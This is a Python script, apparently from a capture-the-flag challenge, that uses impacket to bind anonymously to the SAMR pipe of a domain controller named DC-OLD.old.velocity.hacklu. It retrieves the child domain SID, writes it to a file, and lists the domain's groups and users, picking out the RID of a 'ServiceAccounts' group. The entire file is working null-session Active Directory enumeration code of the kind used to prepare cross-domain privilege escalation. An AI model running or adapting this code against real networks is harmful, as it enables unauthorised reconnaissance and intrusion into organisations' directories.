import os
from impacket.dcerpc.v5 import rpcrt, samr, transport

remote = "DC-OLD.old.velocity.hacklu"
rpc = transport.DCERPCTransportFactory(rf"ncacn_np:{remote}[\pipe\samr]")
rpc.setRemoteHost("10.244.0.20")
rpc.set_dport(445)
rpc.set_credentials("", "", "")
dce = rpc.get_dce_rpc()
dce.set_auth_type(rpcrt.RPC_C_AUTHN_WINNT)


def text(value):
    try:
        value = value["Data"]
    except Exception:
        pass
    return str(value).rstrip("\x00")


try:
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)
    server = samr.hSamrConnect(
        dce, "\\" + remote + "\x00", samr.SAM_SERVER_LOOKUP_DOMAIN
    )["ServerHandle"]
    sid = samr.hSamrLookupDomainInSamServer(
        dce, server, "old.velocity.hacklu"
    )["DomainId"]
    child_sid = sid.formatCanonical()
    print("Child domain SID:", child_sid)
    sid_path = os.environ.get("AD13_CHILD_DOMAIN_SID_FILE")
    if sid_path:
        with open(sid_path, "w", encoding="ascii") as output:
            output.write(child_sid)
    domain = samr.hSamrOpenDomain(
        dce, server, samr.DOMAIN_LIST_ACCOUNTS | samr.DOMAIN_LOOKUP, sid
    )["DomainHandle"]

    groups, context = [], 0
    while True:
        result = samr.hSamrEnumerateGroupsInDomain(
            dce, domain, enumerationContext=context
        )
        groups.extend(
            (text(item["Name"]), int(item["RelativeId"]))
            for item in result["Buffer"]["Buffer"] or []
        )
        context = int(result["EnumerationContext"])
        if int(result["ErrorCode"]) == 0:
            break

    users, context = [], 0
    while True:
        result = samr.hSamrEnumerateUsersInDomain(
            dce, domain, userAccountControl=0, enumerationContext=context
        )
        users.extend(text(item["Name"]) for item in result["Buffer"]["Buffer"] or [])
        context = int(result["EnumerationContext"])
        if int(result["ErrorCode"]) == 0:
            break

    print("ServiceAccounts RID:", next(rid for name, rid in groups if name == "ServiceAccounts"))
    print("Users:", ", ".join(users))
finally:
    try:
        dce.disconnect()
    except Exception:
        pass
